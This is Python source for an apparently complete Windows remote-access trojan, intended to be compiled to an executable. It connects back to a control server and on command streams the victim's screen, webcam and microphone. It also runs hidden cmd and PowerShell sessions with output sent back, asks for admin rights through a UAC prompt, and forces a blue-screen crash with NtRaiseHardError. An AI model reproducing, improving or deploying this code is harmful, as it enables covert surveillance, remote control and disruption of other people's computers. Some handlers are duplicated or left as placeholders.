import socketio
import os
import platform
import subprocess
import time
import uuid
import sys
import ctypes
import threading
import mss
import base64
from PIL import Image
from PIL import ImageGrab
import io
import zlib
import cv2
import numpy as np
from datetime import datetime
import wmi
from queue import Queue
from threading import Event
import pyaudio
import wave
# this script will compiled to exe using pyinstaller
SERVER_URL = "http://localhost"
sio = socketio.Client()

# Add at the top with other global variables
active_sessions = {}
camera_thread = None
microphone_thread = None
current_camera = None
current_microphone = None

class ScreenShareThread(threading.Thread):
    def __init__(self, socket, quality=50):
        super().__init__()
        self.socket = socket
        self.running = False
        self.quality = quality
        self.last_frame_time = 0
        self.frame_interval = 1/15  # Reduced to 15 FPS for better performance
        self.previous_frame = None
        self._stop_event = Event()
        
    def run(self):
        with mss.mss() as sct:
            monitor = sct.monitors[1]
            
            # Reduced resolution for better performance
            src_width = monitor["width"]
            src_height = monitor["height"]
            scale_factor = 960 / src_width  # Reduced to 960p width
            target_width = int(src_width * scale_factor)
            target_height = int(src_height * scale_factor)

            while self.running:
                try:
                    current_time = time.time()
                    if current_time - self.last_frame_time < self.frame_interval:
                        time.sleep(0.005)
                        continue

                    # Capture frame
                    screenshot = np.array(sct.grab(monitor))
                    
                    # Resize with lower quality for performance
                    screenshot = cv2.resize(
                        screenshot, 
                        (target_width, target_height),
                        interpolation=cv2.INTER_LINEAR
                    )

                    # Convert to grayscale for change detection
                    gray = cv2.cvtColor(screenshot, cv2.COLOR_BGR2GRAY)
                    
                    # Skip if frame hasn't changed much
                    if self.previous_frame is not None:
                        diff = cv2.absdiff(gray, self.previous_frame)
                        if np.mean(diff) < 2.0:  # Adjust threshold as needed
                            time.sleep(0.01)
                            continue

                    self.previous_frame = gray

                    # Compress frame
                    encode_params = [
                        cv2.IMWRITE_JPEG_QUALITY, self.quality,
                        cv2.IMWRITE_JPEG_OPTIMIZE, 1,
                        cv2.IMWRITE_JPEG_PROGRESSIVE, 1
                    ]
                    
                    _, buffer = cv2.imencode('.jpg', screenshot, encode_params)
                    
                    # Additional compression if frame is too large
                    compressed_data = buffer.tobytes()
                    if len(compressed_data) > 100000:  # 100KB threshold
                        compressed_data = zlib.compress(compressed_data, level=1)
                        is_compressed = True
                    else:
                        is_compressed = False

                    # Send frame
                    img_base64 = base64.b64encode(compressed_data).decode()
                    self.socket.emit('screen_frame', {
                        'image': img_base64,
                        'compressed': is_compressed,
                        'timestamp': current_time
                    })
                    
                    self.last_frame_time = current_time
                    time.sleep(0.01)  # Small sleep to prevent CPU overload

                except Exception as e:
                    print(f"Screen capture error: {e}")
                    time.sleep(0.1)
    
    def update_quality(self, quality):
        self.quality = max(10, min(100, quality))

    def stop(self):
        self.running = False
        self._stop_event.set()

class CameraThread(threading.Thread):
    def __init__(self, socket, device_id=0, quality=50):
        super().__init__()
        self.socket = socket
        self.device_id = device_id
        self.quality = quality
        self.running = False
        self._stop_event = Event()
        print(f"Initializing camera thread for device {device_id}")

    def run(self):
        cap = None
        try:
            # Try DirectShow first
            print(f"Attempting to open camera {self.device_id} with DirectShow")
            cap = cv2.VideoCapture(self.device_id + cv2.CAP_DSHOW)
            if not cap.isOpened():
                print("DirectShow failed, trying default backend")
                cap = cv2.VideoCapture(self.device_id)
                if not cap.isOpened():
                    raise Exception(f"Failed to open camera {self.device_id}")
            
            # Configure camera
            cap.set(cv2.CAP_PROP_FRAME_WIDTH, 640)
            cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 480)
            cap.set(cv2.CAP_PROP_FPS, 30)
            
            print(f"Camera {self.device_id} initialized successfully")
            self.running = True
            
            while self.running:
                ret, frame = cap.read()
                if ret:
                    try:
                        # Resize and encode frame
                        frame = cv2.resize(frame, (640, 480))
                        _, buffer = cv2.imencode('.jpg', frame, [
                            cv2.IMWRITE_JPEG_QUALITY, self.quality,
                            cv2.IMWRITE_JPEG_PROGRESSIVE, 1,
                            cv2.IMWRITE_JPEG_OPTIMIZE, 1
                        ])
                        img_base64 = base64.b64encode(buffer).decode()
                        
                        # Send frame
                        self.socket.emit('camera_frame', {
                            'image': img_base64,
                            'timestamp': time.time()
                        })
                    except Exception as e:
                        print(f"Error processing frame: {e}")
                else:
                    print("Failed to read camera frame")
                    break
                
                time.sleep(1/30)  # Limit to 30 FPS
                
        except Exception as e:
            error_msg = f"Camera error: {e}"
            print(error_msg)
            self.socket.emit('camera_error', {'error': error_msg})
        finally:
            self.running = False
            if cap:
                cap.release()
            print(f"Camera {self.device_id} released")

    def stop(self):
        print(f"Stopping camera {self.device_id}")
        self.running = False
        self._stop_event.set()

class MicrophoneThread(threading.Thread):
    def __init__(self, socket, device_id=None):
        super().__init__()
        self.socket = socket
        self.device_id = device_id
        self.running = False
        self._stop_event = Event()
        
    def run(self):
        try:
            CHUNK = 1024
            FORMAT = pyaudio.paFloat32
            CHANNELS = 1
            RATE = 44100
            
            p = pyaudio.PyAudio()
            stream = p.open(format=FORMAT,
                          channels=CHANNELS,
                          rate=RATE,
                          input=True,
                          input_device_index=self.device_id,
                          frames_per_buffer=CHUNK)
            
            self.running = True
            while self.running:
                try:
                    data = stream.read(CHUNK, exception_on_overflow=False)
                    # Use numpy for audio processing instead of audioop
                    audio_data = np.frombuffer(data, dtype=np.float32)
                    # Calculate RMS level
                    level = float(np.sqrt(np.mean(np.square(audio_data))))
                    
                    self.socket.emit('audio_data', {
                        'audioLevel': level,
                        'timestamp': time.time()
                    })
                    time.sleep(0.01)  # Small sleep to prevent overwhelming the socket
                except Exception as e:
                    print(f"Audio streaming error: {e}")
                    break
                    
            stream.stop_stream()
            stream.close()
            p.terminate()
        except Exception as e:
            print(f"Microphone error: {e}")
            self.socket.emit('audio_error', {'error': str(e)})
            self.running = False

    def stop(self):
        self.running = False
        self._stop_event.set()

# Global variable for screen sharing thread
screen_share_thread = None

def get_reliable_windows_id():
    """Generate a reliable unique ID for the Windows machine."""
    try:
        bios_serial_cmd = ['powershell', '-Command', 
                           "(Get-WmiObject -Class Win32_BIOS).SerialNumber"]
        result_bios_serial = subprocess.run(bios_serial_cmd, capture_output=True, text=True)
        bios_serial = result_bios_serial.stdout.strip()

        uuid_cmd = ['powershell', '-Command', 
                    "(Get-WmiObject -Class Win32_ComputerSystemProduct).UUID"]
        result_uuid = subprocess.run(uuid_cmd, capture_output=True, text=True)
        uuid_str = result_uuid.stdout.strip()

        return f"{bios_serial}-{uuid_str}"
    except Exception as e:
        print(f"Error generating unique ID: {e}")
        return str(uuid.uuid4())

def show_message(message):
    """Display a message box to the user."""
    try:
        ctypes.windll.user32.MessageBoxW(0, message, "Message from Server", 0x40)
    except Exception as e:
        print(f"Failed to show message box: {e}")
        print(f"Message from server: {message}")

def get_windows_version():
    """Get detailed Windows version information."""
    try:
        w = wmi.WMI()
        os_info = w.Win32_OperatingSystem()[0]
        return f"{os_info.Caption} (Build {os_info.BuildNumber})"
    except Exception as e:
        print(f"Error getting Windows version: {e}")
        # Fallback to platform module
        return platform.system() + " " + platform.release()

# Generate client information
unique_id = get_reliable_windows_id()
print(f"Unique ID: {unique_id}")

client_info = {
    "unique_id": unique_id,
    "username": os.getlogin(),
    "os_version": get_windows_version(),
}

@sio.on("connect")
def on_connect():
    """Send client info to the server after connecting."""
    print("Connected to server. Sending client info...")
    sio.emit("register_client", client_info)
    
    # Notify about client reconnect
    try:
        sio.emit("shell_output", {
            "type": "client_reconnect",
            "output": "Client reconnected"
        })
    except Exception as e:
        print(f"Error sending reconnect notification: {e}")
    
    # Check and emit admin status immediately after connection
    try:
        admin_status = bool(ctypes.windll.shell32.IsUserAnAdmin())
        print(f"Initial admin check result: {admin_status}")
        sio.emit("shell_output", {
            "type": "admin_check",
            "isAdmin": admin_status,
            "output": "Administrator" if admin_status else "Standard User"
        })
    except Exception as e:
        print(f"Error checking initial admin status: {e}")
        sio.emit("shell_output", {
            "type": "admin_check",
            "isAdmin": False,
            "output": f"Error checking admin status: {str(e)}"
        })

@sio.on("client_id_assigned")
def on_client_id_assigned(data):
    """Store the assigned unique ID for future use."""
    global unique_id
    unique_id = data["unique_id"]
    print(f"Client ID assigned: {unique_id}")

@sio.on("execute")
def on_execute(data):
    """Handle commands sent by the server."""
    global screen_share_thread, camera_thread, microphone_thread, current_camera, current_microphone
    
    command = data.get("command", "").strip()
    print(f"Received command: {command}")  # Debug print
    
    if command == "get_devices":
        try:
            cameras = []
            microphones = []
            
            # Camera detection with multiple backends
            def try_camera(index, backend=None):
                try:
                    if backend:
                        cap = cv2.VideoCapture(index + backend)
                    else:
                        cap = cv2.VideoCapture(index)
                        
                    if cap.isOpened():
                        ret, _ = cap.read()
                        if ret:
                            return True
                    cap.release()
                except:
                    pass
                return False

            # Try different camera backends
            for i in range(5):  # Check first 5 cameras
                camera_found = False
                # Try DirectShow first
                if try_camera(i, cv2.CAP_DSHOW):
                    camera_found = True
                # Try default backend if DirectShow fails
                elif try_camera(i):
                    camera_found = True
                
                if camera_found:
                    cameras.append({
                        "deviceId": i,
                        "label": f"Camera {i + 1}"
                    })
                    print(f"Found camera at index {i}")

            # Microphone detection
            try:
                p = pyaudio.PyAudio()
                
                # Get default host API info
                default_host = p.get_default_host_api_info()
                if default_host:
                    print(f"Default audio host: {default_host.get('name')}")
                
                # List all audio devices
                for i in range(p.get_device_count()):
                    try:
                        device_info = p.get_device_info_by_index(i)
                        print(f"Checking audio device {i}: {device_info.get('name')}")
                        
                        if device_info.get('maxInputChannels') > 0:
                            microphones.append({
                                "deviceId": i,
                                "label": device_info.get('name', f"Microphone {i + 1}")
                            })
                            print(f"Found microphone: {device_info.get('name')}")
                    except Exception as e:
                        print(f"Error checking audio device {i}: {e}")
                        continue
                
                p.terminate()
            except Exception as e:
                print(f"Error initializing PyAudio: {e}")

            print(f"Found {len(cameras)} cameras and {len(microphones)} microphones")
            
            # Send device list to client
            sio.emit('device_list', {
                'cameras': cameras,
                'microphones': microphones
            })
            
            # Debug print device lists
            print("Cameras:", cameras)
            print("Microphones:", microphones)
            
            return
            
        except Exception as e:
            print(f"Error getting devices: {e}")
            sio.emit('device_list', {
                'cameras': [],
                'microphones': [],
                'error': str(e)
            })
            return

    # Update camera initialization
    elif command == "start_camera":
        try:
            device_id = int(data.get("deviceId", 0))
            print(f"Attempting to start camera {device_id}")
            
            if camera_thread and camera_thread.is_alive():
                print("Stopping existing camera thread")
                camera_thread.stop()
                camera_thread.join()
            
            # Try to initialize camera
            success = False
            cap = None
            
            # Try DirectShow first
            try:
                print("Trying DirectShow backend")
                cap = cv2.VideoCapture(device_id + cv2.CAP_DSHOW)
                if cap.isOpened():
                    ret, _ = cap.read()
                    if ret:
                        success = True
                        print("Camera initialized with DirectShow")
            except Exception as e:
                print(f"DirectShow initialization failed: {e}")
            
            # Try default backend if DirectShow failed
            if not success:
                try:
                    print("Trying default backend")
                    cap = cv2.VideoCapture(device_id)
                    if cap.isOpened():
                        ret, _ = cap.read()
                        if ret:
                            success = True
                            print("Camera initialized with default backend")
                except Exception as e:
                    print(f"Default backend initialization failed: {e}")
            
            if cap:
                cap.release()
            
            if not success:
                raise Exception(f"Could not initialize camera {device_id}")
            
            current_camera = device_id
            camera_thread = CameraThread(sio, device_id)
            camera_thread.start()
            print(f"Camera thread started for device {device_id}")
            return
            
        except Exception as e:
            error_msg = f"Error starting camera: {e}"
            print(error_msg)
            sio.emit('camera_error', {'error': error_msg})
            return

    elif command == "stop_camera":
        if camera_thread and camera_thread.is_alive():
            camera_thread.stop()
            camera_thread.join()
            camera_thread = None
            current_camera = None
        return  # Add return statement

    elif command == "start_microphone":
        if microphone_thread and microphone_thread.is_alive():
            microphone_thread.stop()
            microphone_thread.join()
        
        device_id = data.get("deviceId")
        current_microphone = device_id
        microphone_thread = MicrophoneThread(sio, device_id)
        microphone_thread.start()
        return  # Add return statement

    elif command == "stop_microphone":
        if microphone_thread and microphone_thread.is_alive():
            microphone_thread.stop()
            microphone_thread.join()
            microphone_thread = None
            current_microphone = None
        return  # Add return statement

    elif command == "check_admin":
        try:
            admin_status = bool(ctypes.windll.shell32.IsUserAnAdmin())
            print(f"Admin check result: {admin_status}")
            
            # Emit status for both shell and dashboard
            sio.emit("shell_output", {
                "type": "admin_check",
                "isAdmin": admin_status,
                "output": "Administrator" if admin_status else "Standard User"
            })
            
            # Emit specific event for dashboard
            sio.emit("client_admin_status", {
                "client_id": client_info["unique_id"],
                "isAdmin": admin_status
            })
            
        except Exception as e:
            print(f"Error checking admin status: {e}")
            sio.emit("shell_output", {
                "type": "admin_check",
                "isAdmin": False,
                "output": f"Error checking admin status: {str(e)}"
            })
        return
    
    elif command == "elevate":
        try:
            if not ctypes.windll.shell32.IsUserAnAdmin():
                print("Attempting to elevate privileges...")
                
                # Get the current executable path
                if getattr(sys, 'frozen', False):
                    # If compiled with PyInstaller
                    current_exe = sys.executable
                    params = ''  # No need for script path when using exe
                else:
                    # If running as Python script
                    current_exe = sys.executable
                    script = os.path.abspath(sys.argv[0])
                    params = ' '.join([script] + sys.argv[1:])
                
                # Launch new elevated process
                ret = ctypes.windll.shell32.ShellExecuteW(
                    None, 
                    "runas",
                    current_exe,
                    params,
                    None, 
                    1
                )
                
                if ret > 32:
                    print("Elevation successful, terminating current instance...")
                    sio.emit("shell_output", {
                        "output": "Elevating privileges... New window will open with admin rights.",
                        "type": "system"
                    })
                    
                    # Emit final admin status update
                    sio.emit("shell_output", {
                        "type": "admin_check",
                        "isAdmin": True,
                        "output": "Administrator"
                    })
                    
                    # Clean up and exit
                    if screen_share_thread and screen_share_thread.is_alive():
                        screen_share_thread.stop()
                        screen_share_thread.join(timeout=1)
                    
                    sio.disconnect()
                    
                    # Force terminate the process
                    try:
                        import psutil
                        current_process = psutil.Process(os.getpid())
                        parent = current_process.parent()
                        if parent:
                            parent.terminate()
                        current_process.terminate()
                    except:
                        pass
                    
                    # Final fallback exit
                    os._exit(0)
                else:
                    sio.emit("shell_output", {
                        "output": "Failed to elevate privileges.",
                        "type": "error"
                    })
            else:
                # Already admin, update status
                sio.emit("shell_output", {
                    "type": "admin_check",
                    "isAdmin": True,
                    "output": "Administrator"
                })
                sio.emit("shell_output", {
                    "output": "Already running with administrator privileges",
                    "type": "system"
                })
        except Exception as e:
            print(f"Elevation error: {e}")
            sio.emit("shell_output", {
                "output": f"Failed to elevate: {str(e)}",
                "type": "error"
            })
            # Update admin status on error
            sio.emit("shell_output", {
                "type": "admin_check",
                "isAdmin": False,
                "output": "Standard User"
            })
        return

    elif command == "restartclient":
        if screen_share_thread:
            screen_share_thread.stop()
        print("Restarting client...")
        sio.disconnect()
        
        try:
            # Get the full path of the current script
            if getattr(sys, 'frozen', False):
                # If compiled with PyInstaller
                script_path = sys.executable
                os.execv(script_path, [script_path] + sys.argv[1:])
            else:
                # If running as Python script
                script_path = os.path.abspath(__file__)
                os.execv(sys.executable, [sys.executable, script_path] + sys.argv[1:])
        except Exception as e:
            print(f"Error restarting client: {e}")
            # Attempt alternative restart method
            subprocess.Popen([sys.executable] + sys.argv)
            sys.exit()
    
    # In the execute command handler:
    if command == "start_screen_share":
        if screen_share_thread is None or not screen_share_thread.is_alive():
            screen_share_thread = ScreenShareThread(sio)
            screen_share_thread.running = True
            screen_share_thread.start()
            print("Screen sharing started")
    
    elif command == "stop_screen_share":
        if screen_share_thread and screen_share_thread.is_alive():
            screen_share_thread.stop()
            screen_share_thread.join()
            screen_share_thread = None
            print("Screen sharing stopped")
    
    elif command == "trigger_bsod":
        try:
            trigger_bsod()
            print("BSOD triggered")
        except Exception as e:
            print(f"Error triggering BSOD: {e}")    
    elif command == "shutdown":
        if screen_share_thread:
            screen_share_thread.stop()
        print("Executing shutdown command...")
        os.system("shutdown /s /t 1")
        
    elif command == "restart":
        if screen_share_thread:
            screen_share_thread.stop()
        print("Executing restart command...")
        os.system("shutdown /r /t 1")
        
    elif command == "info":
        system_info = f"""
        Username: {os.getlogin()}
        OS: {platform.system()} {platform.release()}
        Machine: {platform.machine()}
        Processor: {platform.processor()}
        """
        show_message(system_info)
        
    elif command == "message":
        if "message" in data:
            show_message(data["message"])
            
    elif command == "shell":
        shell_type = data.get("shell_type", "cmd")
        shell_command = data.get("shell_command", "")
        
        if shell_command == "check_admin":
            try:
                admin_status = bool(ctypes.windll.shell32.IsUserAnAdmin())
                response = {
                    "type": "admin_check",
                    "isAdmin": admin_status,
                    "output": "Administrator" if admin_status else "Standard User"
                }
                print(f"Sending admin status response: {response}")  # Debug print
                sio.emit("shell_output", response)
            except Exception as e:
                print(f"Error checking admin status: {e}")
                sio.emit("shell_output", {
                    "type": "admin_check",
                    "isAdmin": False,
                    "output": f"Error checking admin status: {str(e)}"
                })
            return
        elif shell_command == "elevate":
            try:
                if not ctypes.windll.shell32.IsUserAnAdmin():
                    script = os.path.abspath(sys.argv[0])
                    params = ' '.join([script] + sys.argv[1:])
                    ret = ctypes.windll.shell32.ShellExecuteW(
                        None, "runas", sys.executable, params, None, 1
                    )
                    if ret > 32:
                        sio.emit("shell_output", {
                            "output": "Elevating privileges... Please accept the UAC prompt.",
                            "type": "system"
                        })
                        if screen_share_thread:
                            screen_share_thread.stop()
                        print("Restarting client...")
                        sio.disconnect()
                        sys.exit(0)
                    else:
                        sio.emit("shell_output", {
                            "output": "Failed to elevate privileges.",
                            "type": "error"
                        })
                else:
                    sio.emit("shell_output", {
                        "output": "Already running with administrator privileges.",
                        "type": "system"
                    })
            except Exception as e:
                sio.emit("shell_output", {
                    "output": f"Error during elevation: {str(e)}",
                    "type": "error"
                })
            return
        
        try:
            if shell_command == "check_admin":
                # ... existing admin check code ...
                return
            elif shell_command == "elevate":
                # ... existing elevate code ...
                return

            is_session = shell_type.endswith('_session')
            
            if shell_type.startswith("powershell"):
                if is_session:
                    if "powershell_session" not in active_sessions:
                        process = subprocess.Popen(
                            ["powershell", "-NoProfile", "-NoExit"],
                            stdout=subprocess.PIPE,
                            stderr=subprocess.PIPE,
                            stdin=subprocess.PIPE,
                            text=True,
                            bufsize=1,  # Line buffering
                            universal_newlines=True,
                            creationflags=subprocess.CREATE_NO_WINDOW
                        )
                        output_queue = Queue()
                        
                        # Start output reading threads
                        read_thread = threading.Thread(
                            target=read_session_output,
                            args=(process, sio, output_queue)
                        )
                        process_thread = threading.Thread(
                            target=process_output_queue,
                            args=(output_queue, sio)
                        )
                        
                        read_thread.daemon = True
                        process_thread.daemon = True
                        read_thread.start()
                        process_thread.start()
                        
                        active_sessions["powershell_session"] = ShellSession(
                            process,
                            (read_thread, process_thread),
                            output_queue
                        )
                    
                    session = active_sessions["powershell_session"]
                    session.process.stdin.write(f"{shell_command}\n")
                    session.process.stdin.flush()
                else:
                    # Create a new PowerShell process for non-session commands
                    process = subprocess.Popen(
                        ["powershell", "-NoProfile", "-NonInteractive", "-Command", shell_command],
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        stdin=subprocess.PIPE,
                        text=True,
                        universal_newlines=True,
                        creationflags=subprocess.CREATE_NO_WINDOW
                    )
                    output_thread = threading.Thread(
                        target=handle_shell_output,
                        args=(process, sio)
                    )
                    output_thread.daemon = True
                    output_thread.start()

            else:  # cmd
                if is_session:
                    if "cmd_session" not in active_sessions:
                        process = subprocess.Popen(
                            ["cmd"],
                            stdout=subprocess.PIPE,
                            stderr=subprocess.PIPE,
                            stdin=subprocess.PIPE,
                            text=True,
                            bufsize=1,  # Line buffering
                            universal_newlines=True,
                            creationflags=subprocess.CREATE_NO_WINDOW
                        )
                        output_queue = Queue()
                        
                        # Start output reading threads
                        read_thread = threading.Thread(
                            target=read_session_output,
                            args=(process, sio, output_queue)
                        )
                        process_thread = threading.Thread(
                            target=process_output_queue,
                            args=(output_queue, sio)
                        )
                        
                        read_thread.daemon = True
                        process_thread.daemon = True
                        read_thread.start()
                        process_thread.start()
                        
                        active_sessions["cmd_session"] = ShellSession(
                            process,
                            (read_thread, process_thread),
                            output_queue
                        )
                    
                    session = active_sessions["cmd_session"]
                    session.process.stdin.write(f"{shell_command}\n")
                    session.process.stdin.flush()
                else:
                    # Create a new CMD process for non-session commands
                    process = subprocess.Popen(
                        ["cmd", "/c", shell_command],
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        stdin=subprocess.PIPE,
                        text=True,
                        universal_newlines=True,
                        creationflags=subprocess.CREATE_NO_WINDOW
                    )
                    output_thread = threading.Thread(
                        target=handle_shell_output,
                        args=(process, sio)
                    )
                    output_thread.daemon = True
                    output_thread.start()

            print(f"Executing {shell_type} command: {shell_command}")

        except Exception as e:
            error_msg = f"Error executing command: {str(e)}"
            print(error_msg)
            sio.emit("shell_output", {
                "output": error_msg,
                "type": "error"
            })
    if command not in ["get_devices", "start_camera", "stop_camera", 
                      "start_microphone", "stop_microphone",
                      "start_screen_share", "stop_screen_share",
                      "check_admin", "elevate", "restartclient", "shutdown",
                      "restart", "info", "message", "shell", "trigger_bsod"]:
        print(f"Unknown command: {command}")
    else:
        print(f"Unknown command: {command}")

@sio.on("force_reconnect")
def on_force_reconnect():
    """Handle forced reconnection request from server."""
    print("Server requested reconnection...")
    sio.disconnect()
    time.sleep(2)
    connect_to_server()

@sio.on("disconnect")
def on_disconnect():
    """Handle server disconnects."""
    print("Disconnected from server.")
    
    # Notify about client disconnect
    try:
        sio.emit("shell_output", {
            "type": "client_disconnect",
            "output": "Client disconnected"
        })
    except Exception as e:
        print(f"Error sending disconnect notification: {e}")
    
    # Clean up active sessions
    for session_type, session in active_sessions.items():
        try:
            session.process.terminate()
            if session.queue.qsize() > 0:
                remaining_output = ""
                while not session.queue.empty():
                    remaining_output += session.queue.get_nowait()
                if remaining_output.strip():
                    sio.emit("shell_output", {
                        "output": remaining_output,
                        "type": "stdout"
                    })
        except Exception as e:
            print(f"Error cleaning up session {session_type}: {e}")
    
    active_sessions.clear()
    
    # Stop screen sharing if active
    global screen_share_thread
    if screen_share_thread and screen_share_thread.is_alive():
        screen_share_thread.stop()
        screen_share_thread.join()
        screen_share_thread = None
    
    connect_to_server()

def connect_to_server():
    """Attempt to connect to the server with retries."""
    while True:
        try:
            if not sio.connected:
                print(f"Connecting to server at {SERVER_URL}...")
                sio.connect(SERVER_URL)
                sio.wait()
            break
        except Exception as e:
            print(f"Connection failed: {e}. Retrying in 5 seconds...")
            time.sleep(5)
def trigger_bsod():
    try:
        ntdll = ctypes.windll.ntdll
        prev_value = ctypes.c_bool()
        res = ctypes.c_ulong()
        
        # Adjust the privilege to allow shutdown operations
        status = ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(prev_value))
        if status != 0:
            print("Failed to adjust privilege.")
            return False

        # Trigger a hard error, which can cause a BSOD
        error_status = ntdll.NtRaiseHardError(0xDEADDEAD, 0, 0, None, 6, ctypes.byref(res))
        if error_status != 0:
            print("Failed to raise a hard error.")
            return False
        
        print("Attempted to trigger BSOD.")
        return True
    except Exception as e:
        print(f"Error: {e}")
        return False

def handle_shell_output(process, socket):
    """Read and send shell output in real-time"""
    def read_stream(stream, output_type):
        while True:
            line = stream.readline()
            if not line and process.poll() is not None:
                break
            if line:
                print(f"Sending {output_type}: {line.strip()}")  # Debug line
                socket.emit("shell_output", {
                    "output": line.strip(),
                    "type": output_type
                })

    # Create threads for stdout and stderr
    stdout_thread = threading.Thread(
        target=read_stream, 
        args=(process.stdout, "stdout")
    )
    stderr_thread = threading.Thread(
        target=read_stream, 
        args=(process.stderr, "stderr")
    )

    stdout_thread.daemon = True
    stderr_thread.daemon = True
    
    stdout_thread.start()
    stderr_thread.start()
    
    # Wait for process to complete
    process.wait()
    
    # Send completion message
    socket.emit("shell_output", {
        "output": "Command completed.",
        "type": "system"
    })

def get_directory_listing():
    try:
        result = subprocess.run(
            ['dir' if os.name == 'nt' else 'ls', '-la'],
            capture_output=True,
            text=True,
            shell=True
        )
        return result.stdout
    except Exception as e:
        return f"Error listing directory: {str(e)}"

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        return False

def elevate_privileges():
    if not is_admin():
        try:
            script = os.path.abspath(sys.argv[0])
            params = ' '.join([script] + sys.argv[1:])
            ret = ctypes.windll.shell32.ShellExecuteW(
                None, "runas", sys.executable, params, None, 1
            )
            if ret > 32:
                return True
        except Exception as e:
            return False
    return False

# After successful action completion
def on_action_complete(action):
    sio.emit('action_completed', {
        'action': action,
        'status': 'completed'
    })

# Example usage in your action handlers:
def handle_shutdown():
    on_action_complete('shutdown')
    # proceed with shutdown
    
def handle_restart():
    on_action_complete('restart')
    # proceed with restart

def handle_restartclient():
    on_action_complete('restartclient')
    # proceed with client restart

# etc. for other actions

class ShellSession:
    def __init__(self, process, threads, queue):
        super().__init__()
        self.process = process
        self.threads = threads
        self.queue = queue
        self.current_dir = os.getcwd()

def read_session_output(process, sio, queue):
    """Continuously read and send session output"""
    while True:
        try:
            # Read one character at a time for real-time output
            char = process.stdout.read(1)
            if not char and process.poll() is not None:
                break
            if char:
                queue.put(char)
        except Exception as e:
            print(f"Error reading session output: {e}")
            break

def process_output_queue(queue, sio):
    """Process and send queued output"""
    buffer = ""
    while True:
        try:
            char = queue.get()
            buffer += char
            
            # Send buffer when we get a newline or buffer is large enough
            if '\n' in buffer or len(buffer) > 80:
                if buffer.strip():  # Only send non-empty lines
                    sio.emit("shell_output", {
                        "output": buffer,
                        "type": "stdout"
                    })
                buffer = ""
        except Exception as e:
            print(f"Error processing output queue: {e}")
            break

if __name__ == "__main__":
    connect_to_server()